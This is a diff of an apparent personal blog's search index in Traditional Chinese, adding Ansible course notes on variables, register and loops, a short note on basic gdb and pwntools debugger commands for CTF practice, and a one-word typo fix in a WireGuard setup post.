+<tbody><tr>
+<td>-v</td>
+<td>顯示任務結果。</td>
+</tr>
+<tr>
+<td>-vv</td>
+<td>任務結果和任務配置都會顯示</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>包含關於與受管主機連接的資訊</td>
+</tr>
+<tr>
+<td>-vvvv</td>
+<td>增加了連接外掛程式相關的額外詳細程度選項，包括受管主機上用於執行腳本的用戶，以及所執行的腳本</td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>$ansible-navigator run newuser.yml -m stdout --syntax-check</code><ul>
+<li>檢查語法錯誤 or 縮排</li>
+</ul>
+</li>
+</ul>
+<h3 id="Variable-Fact"><a href="#Variable-Fact" class="headerlink" title="Variable &amp; Fact"></a>Variable &amp; Fact</h3><h4 id="Playbook-variable"><a href="#Playbook-variable" class="headerlink" title="Playbook variable"></a>Playbook variable</h4><ul>
+<li><code>$vim newuser.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">useradd</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">bind_server</span></span><br><span class="line">  <span class="attr">vars:</span> </span><br><span class="line">    <span class="attr">user1:</span> <span class="string">chiawei</span></span><br><span class="line">    <span class="attr">uid1:</span> <span class="number">5566</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">userlist.yml</span> <span class="comment">#</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;user1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid1&#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span>  <span class="comment"># default</span></span><br><span class="line">        </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user2 &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;uid2&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div></li>
+<li><code>$vim userlist.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user2:</span> <span class="string">fan</span></span><br><span class="line"><span class="attr">uid2:</span> <span class="number">1234</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h4 id="Host-group-variable"><a href="#Host-group-variable" class="headerlink" title="Host &amp; group variable"></a>Host &amp; group variable</h4><ul>
+<li><code>vim inventory</code></li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bind_server]</span><br><span class="line">servera.lab.example.com ip4.addr=172.25.250.11 # Host variable</span><br><span class="line">serverb.lab.example.com ip4.addr=172.25.250.12</span><br><span class="line"></span><br><span class="line">[bind_server:vars] # group variable</span><br><span class="line">install_sodtware = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br><span class="line"></span><br><span class="line">[unbound_server]</span><br><span class="line">servverc.lab.example.com</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$mkdir group_vars host_vars</code></li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> group_vars </span><br><span class="line"><span class="variable">$mkdir</span> host_vars</span><br><span class="line"><span class="variable">$cd</span> group_vars</span><br><span class="line"><span class="variable">$vim</span> bind_server</span><br><span class="line"><span class="variable">$cd</span> ..</span><br><span class="line"><span class="variable">$cd</span> host_vars</span><br><span class="line"><span class="variable">$vim</span> servera.lab.example.com</span><br><span class="line"><span class="variable">$vim</span> serverb.lab.example.com</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$vim bind_server</code></li>
+</ul>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">install_software = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$vim servera.lab.example.com</code></li>
+</ul>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.11</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>$vim serverb.lab.example.com</code></li>
+</ul>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.12</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$tree</code></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HkTGL0wmT.png"
+                      alt="image.png"
+                ></p>
+<h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><ul>
+<li><p>register 語法可以取得命令輸出，並保存在一個臨時變數中</p>
+</li>
+<li><p><code>$vim newuser.yml</code></p>
+<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Addusers</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add</span> <span class="string">different</span> <span class="string">user</span> <span class="string">in</span> <span class="string">different</span> <span class="string">server</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;newuser_name&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">results</span></span><br><span class="line">      <span class="attr">ansible.builtin.debugg:</span></span><br><span class="line">        <span class="attr">var:</span> <span class="string">useradd_result</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><code>$ansible-navigator run newuser.yml -m stdout</code></p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1Eos0wXT.png"
+                      alt="image.png"
+                ></p>
+<h4 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h4><h3 id="Task-control"><a href="#Task-control" class="headerlink" title="Task control"></a>Task control</h3><ul>
+<li><code>$vim user_add.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">User</span> <span class="string">Management</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">serverd.lab.example.com</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">user_lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hcyang</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1236</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jjli</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1235</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> &#123;&#123; <span class="string">item.name</span> &#125;&#125; </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.user_id &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user_lists &#125;&#125;</span>&quot;</span> </span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">print</span> <span class="string">results</span> </span><br><span class="line">      <span class="attr">ansible.builtin.debug:</span></span><br><span class="line">        <span class="attr">msg:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        An user is add with name &#123;&#123; item.name &#125;&#125; </span></span><br><span class="line"><span class="string"></span>      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; useradd_result. results &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h2 id="期末考整理"><a href="#期末考整理" class="headerlink" title="期末考整理"></a>期末考整理</h2><p><code>DNS Http varnish database</code></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=VhXenrYuYcE" >DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=0em4LrNN_v8" >HTTP_server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Https cerify ~1:10:00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Varnish and haproxy 1:10:00 ~  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a href="">Database</a></p>
+]]></content>
+      <categories>
+        <category>csie</category>
+      </categories>
+      <tags>
+        <tag>csie</tag>
+        <tag>server</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>How to use gdb-WriteUp</title>
+    <url>/2024/08/09/pwn/</url>
+    <content><![CDATA[<h2 id="How-to-use-gdb"><a href="#How-to-use-gdb" class="headerlink" title="How to use gdb"></a>How to use gdb</h2><blockquote>
+<p>因為我寫到srop的lab才發現我不會用gdb，所以這邊趕快補一下🤧</p>
+</blockquote>
+<h3 id="open-gdb"><a href="#open-gdb" class="headerlink" title="open gdb"></a>open gdb</h3><ul>
+<li><p>attach <code>&lt;pid&gt;</code></p>
+</li>
+<li><p>pwntools open gdb</p>
+  <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;+h&#x27;</span>] <span class="comment"># 要先開tmux</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r) <span class="comment"># 在想要的位置開gdb</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h3 id="調適"><a href="#調適" class="headerlink" title="調適"></a>調適</h3><p>gdb <strong>Commands</strong></p>
+<ul>
+<li>r &#x3D; run：運行程式。如果程式已經在運行，輸入 r 會重新啟動程式。</li>
+<li>b &#x3D; break：設置斷點，通常在調試pwn時用來在特定的記憶體地址處停住程式，例如 b 0x400908 或 b *main+&lt;行號&gt;。</li>
+<li>c &#x3D; continue：繼續執行程式，直到遇到下一個斷點。</li>
+<li>n &#x3D; next：執行下一行指令。</li>
+<li>ni &#x3D; nexti：執行下一條指令，這是真正的下一個組譯指令。</li>
+<li>s &#x3D; step：單步執行程式，當進入到不同的函數時會停下來，一般會在呼叫 call 之後停在被呼叫函數的開始位置。</li>
+<li>d &#x3D; delete：刪除斷點，後面可以跟數字來指定刪除哪個斷點。如果不帶參數，則刪除全部斷點。</li>
+<li>x：查看記憶體內容。</li>
+<li>xinfo: 指定地址的值及其對應的內存內容。</li>
+</ul>
+<blockquote>
+<p>補完發現好想沒什麼好補的，剩下也是靠經驗🤧</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LYS SROP lab WriteUp</title>
     <url>/2024/08/20/srop-WriteUp/</url>
     <content><![CDATA[<blockquote>
@@ -1947,7 +1947,7 @@
     <content><![CDATA[<h2 id="Setup-wireguard-VPN"><a href="#Setup-wireguard-VPN" class="headerlink" title="Setup wireguard VPN"></a>Setup wireguard VPN</h2><blockquote>
 <p>要先有一台機器</p>
 <blockquote>
-<p>租個雲服務都可以，這邊推進 <a class="link"   href="https://linode.com/" >Linode <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>租個雲服務都可以，這邊推薦 <a class="link"   href="https://linode.com/" >Linode <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
 </blockquote>
 <p><code>sudo apt install wireguard</code></p>
